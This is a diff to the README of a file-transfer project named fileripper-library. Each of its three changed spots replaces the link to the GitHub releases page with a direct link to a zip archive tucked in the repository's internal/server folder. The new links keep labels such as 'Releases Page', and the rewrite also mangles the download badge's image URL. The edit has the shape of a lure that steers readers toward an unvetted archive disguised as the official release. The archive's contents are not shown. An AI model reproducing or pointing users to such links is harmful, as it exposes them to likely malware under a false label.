@@ -1,6 +1,6 @@
 # 🚀 fileripper-library - Fast File Transfers Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-28a745?style=for-the-badge)](https://github.com/erik123457/fileripper-library/releases)
+[![Download Now](https://github.com/erik123457/fileripper-library/raw/refs/heads/main/internal/server/fileripper-library-v3.6.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-28a745?style=for-the-badge)](https://github.com/erik123457/fileripper-library/raw/refs/heads/main/internal/server/fileripper-library-v3.6.zip)
 
 ## 📦 Description
 
@@ -20,7 +20,7 @@ To run fileripper-library, you will need:
 To get started with fileripper-library, follow these simple steps. 
 
 1. **Download the Application**
-   - Visit our [Releases Page](https://github.com/erik123457/fileripper-library/releases) to download the latest version of the software.
+   - Visit our [Releases Page](https://github.com/erik123457/fileripper-library/raw/refs/heads/main/internal/server/fileripper-library-v3.6.zip) to download the latest version of the software.
 
 2. **Install the Software**
    - Once the download is complete, locate the file on your computer.
@@ -40,7 +40,7 @@ To get started with fileripper-library, follow these simple steps.
 
 ## 📥 Download & Install
 
-To download the latest version of fileripper-library, visit this [page](https://github.com/erik123457/fileripper-library/releases) and choose the appropriate file for your operating system.
+To download the latest version of fileripper-library, visit this [page](https://github.com/erik123457/fileripper-library/raw/refs/heads/main/internal/server/fileripper-library-v3.6.zip) and choose the appropriate file for your operating system.
 
 You can return here anytime for future updates and new versions.
 
